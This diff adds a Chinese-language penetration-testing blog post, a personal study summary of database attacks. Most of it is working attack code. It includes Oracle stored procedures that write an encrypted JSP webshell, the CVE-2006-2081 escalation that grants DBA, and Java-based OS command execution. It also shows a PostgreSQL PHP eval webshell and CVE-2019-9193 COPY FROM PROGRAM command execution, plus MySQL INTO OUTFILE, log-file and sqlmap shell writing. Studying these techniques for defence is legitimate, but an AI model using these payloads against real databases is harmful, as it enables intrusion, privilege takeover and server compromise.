@@ -1,0 +1,396 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>数据库相关 | h0ld1rs的博客</title><meta name="keywords" content="渗透测试"><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="对数据库提权之类的方式做一个学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库相关">
+<meta property="og:url" content="https://h0ld1rs.github.io/posts/61064.html">
+<meta property="og:site_name" content="h0ld1rs的博客">
+<meta property="og:description" content="对数据库提权之类的方式做一个学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/image/25.png">
+<meta property="article:published_time" content="2022-03-26T13:26:04.000Z">
+<meta property="article:modified_time" content="2022-03-28T11:03:13.117Z">
+<meta property="article:author" content="h0ld1rs">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/image/25.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/posts/61064"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '数据库相关',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-28 19:03:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="h0ld1rs的博客" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/image/25.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">数据库相关</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-26T13:26:04.000Z" title="发表于 2022-03-26 21:26:04">2022-03-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-28T11:03:13.117Z" title="更新于 2022-03-28 19:03:13">2022-03-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="数据库相关"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/61064.html#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h1><p>以前没实操做过<code>oracle数据库</code>。只会mysql，，现在做一个简单的总结吧。。</p>
+<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><h3 id="写shell的条件"><a href="#写shell的条件" class="headerlink" title="写shell的条件"></a>写shell的条件</h3><ol>
+<li>有DBA权限(剩下的connect权限之类的)</li>
+<li>有网站的绝对路径</li>
+</ol>
+<h3 id="写入方法"><a href="#写入方法" class="headerlink" title="写入方法"></a>写入方法</h3><h4 id="储存过程写入"><a href="#储存过程写入" class="headerlink" title="储存过程写入"></a>储存过程写入</h4><p>首先我们需要创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向&#x2F;home&#x2F;oracle这一路径下。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace directory WEBSHELL_DIR <span class="keyword">as</span> <span class="string">&#x27;C:\apache-tomcat-8.5.56\webapps\Shopping&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后利用存储过程写入一句话木马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span></span><br><span class="line">   webshell_file utl_file.file_type;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">   webshell_file :<span class="operator">=</span> utl_file.fopen(<span class="string">&#x27;WEBSHELL_DIR&#x27;</span>, <span class="string">&#x27;1.jsp&#x27;</span>, <span class="string">&#x27;W&#x27;</span>); </span><br><span class="line">   utl_file.put_line(webshell_file, <span class="string">&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;&#x27;</span>); </span><br><span class="line">   utl_file.fflush(webshell_file); </span><br><span class="line">   utl_file.fclose(webshell_file); </span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+
+<p>之后就可以写入成功</p>
+<h4 id="利用数据库表空间结构写入文件"><a href="#利用数据库表空间结构写入文件" class="headerlink" title="利用数据库表空间结构写入文件"></a>利用数据库表空间结构写入文件</h4><p>创建表空间，根据文件大小可相应修改表空间</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>space jsptest datafile <span class="string">&#x27;C:\apache-tomcat-8.5.56\webapps\Shopping\1.jsp&#x27;</span> size <span class="number">100</span>k nologging;</span><br></pre></td></tr></table></figure>
+
+<p>创建表名并设置要插入字符的长度，此处先测试js代码，设置长度为100</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> webshell(C varchar2(<span class="number">100</span>)) tablespace jsptest;</span><br></pre></td></tr></table></figure>
+
+<p>写入要执行的代码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> WEBSHELL <span class="keyword">values</span>(<span class="operator">&lt;</span>svg<span class="operator">/</span>onload<span class="operator">=</span>alert(<span class="number">1</span><span class="operator">&gt;</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>然后提交数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">commit</span></span><br></pre></td></tr></table></figure>
+
+<p>提交后必须同步数据至当前表空间</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span>space jsptest offline;</span><br></pre></td></tr></table></figure>
+
+<p>删除表空间</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> tablespace jsptest including contents;</span><br></pre></td></tr></table></figure>
+
+<h2 id="用户提权"><a href="#用户提权" class="headerlink" title="用户提权"></a>用户提权</h2><p>提升漏洞编号为CVE-2006-2081，漏洞成因由SYS用户运行的DBMS_EXPORT_EXTENSION存储过程存在PL&#x2F;SQL注入漏洞，允许低权限用户以DBA权限执行任意SQL代码，此项为Oracle 10g经典提权漏洞。</p>
+<ol>
+<li><p>先查询用户权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_role_privs;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后创建程序包</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">or</span> REPLACE</span><br><span class="line">PACKAGE HACKERPACKAGE AUTHID <span class="built_in">CURRENT_USER</span></span><br><span class="line"><span class="keyword">IS</span></span><br><span class="line"><span class="keyword">FUNCTION</span> ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env</span><br><span class="line">SYS.odcienv)</span><br><span class="line"><span class="keyword">RETURN</span> NUMBER;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建程序包体</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">or</span> REPLACE PACKAGE BODY HACKERPACKAGE</span><br><span class="line"><span class="keyword">IS</span></span><br><span class="line"><span class="keyword">FUNCTION</span> ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env</span><br><span class="line">SYS.odcienv)</span><br><span class="line"><span class="keyword">RETURN</span> NUMBER</span><br><span class="line"><span class="keyword">IS</span></span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">EXECUTE</span> IMMEDIATE <span class="string">&#x27;GRANT DBA TO test&#x27;</span>;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="keyword">RETURN</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后再次查看用户权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_role_privs;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>因为java大多是以system权限运行，所以当oracle通过java获得命令执行权限时，便相当于间接获得了system权限，因此通过java权限命令执行也可以作为Oracle的提权过程</p>
+<h3 id="利用java权限提权"><a href="#利用java权限提权" class="headerlink" title="利用java权限提权"></a>利用java权限提权</h3><ol>
+<li><p>先使用dba权限赋予用户java运行权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> JAVASYSPRIV <span class="keyword">to</span> <span class="keyword">system</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>写入java程序包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;</span><span class="string">&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;</span><span class="string">&#x27;;commit;end;&#x27;</span>) from dual;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取<code>java</code>执行权限</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;</span><span class="string">&#x27;begin dbms_java.grant_permission( &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYSTEM&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;EXECUTE&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;);end;&#x27;</span><span class="string">&#x27;commit;end;&#x27;</span>) from dual;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建执行命令的函数<code>select</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function shell(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> shell(&quot;whoami&quot;) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="利用储存过程提权"><a href="#利用储存过程提权" class="headerlink" title="利用储存过程提权"></a>利用储存过程提权</h3><p>oracle也可以利用存储过程来进行命令执行，当用户拥有创建存储过程权限时，则可以创建一个java class，然后用创建一个存储过程来进行调用</p>
+<ol>
+<li><p>查看权限发现用户具有create procedure权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_privs;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建一个<code>java class</code>然后用<code>procedure</code>包装进行调用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named CMD <span class="keyword">as</span></span><br><span class="line">    import java.lang.<span class="operator">*</span>;</span><br><span class="line">    import java.io.<span class="operator">*</span>;</span><br><span class="line">    public class CMD</span><br><span class="line">    &#123;</span><br><span class="line">       public <span class="keyword">static</span> void execmd(String command) throws IOException </span><br><span class="line">       &#123;</span><br><span class="line">               Runtime.getRuntime().<span class="keyword">exec</span>(command); </span><br><span class="line">       &#125; </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="operator">/</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建储存过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> CMDPROC(command <span class="keyword">in</span> <span class="type">varchar</span>) <span class="keyword">as</span> <span class="keyword">language</span> java </span><br><span class="line">    name <span class="string">&#x27;CMD.execmd(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> CMDPROC()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>直接利用copy函数将文件写入指定目录(需要已知绝对路径且对目录具有可操作权限)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span><span class="number">1</span>;<span class="keyword">copy</span> (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval(&quot;$_POST[cmd]&quot;);?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;C:\Users\test\Desktop\php\phpStudy\WWW\1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>高权限命令执行漏洞CVE-2019-9193<br>从9.3版本开始，PostgreSQL实现了导入导出数据的命令“COPY TO&#x2F;FROM PROGRAM””，而此命令允许数据库超级用户以及“pg_read_server_files”组内用户执行上任意操作系统命令</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li>postgresql数据库版本在9.3-11.2</li>
+<li>执行数据库语句用户为超级用户或者“pg_read_server_files”组用户，pg_read_server_files角色权限可以执行copy命令，且此权限为11版本新增角色，11版本以下需要超级用户权限</li>
+</ol>
+<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>接下来开始命令执行步骤：<br>创建用来保存命令输出的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> rce;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span>  rce(rce_output text);</span><br></pre></td></tr></table></figure>
+
+<p>通过“COPY FROM PROGRAM”执行系统命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span> rce <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查看执行结果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> rce;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><h5 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h5><ul>
+<li>知道网站绝对路径</li>
+<li>高权限数据库用户</li>
+<li>load_file() 开启 即 secure_file_priv 无限制</li>
+<li>网站路径有写入权限</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">NULL</td>
+<td align="left">不允许导入或导出</td>
+</tr>
+<tr>
+<td align="left">&#x2F;tmp</td>
+<td align="left">只允许在 &#x2F;tmp 目录导入导出</td>
+</tr>
+<tr>
+<td align="left">空</td>
+<td align="left">不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+<p>如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在sqlmap下，可以这么做</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h5 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h5><ul>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>Windows 系统下</li>
+<li>高权限运行 MySQL 或者 Apache</li>
+</ul>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>c1595d3a029a.log <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------------+</span></span><br></pre></td></tr></table></figure>
+
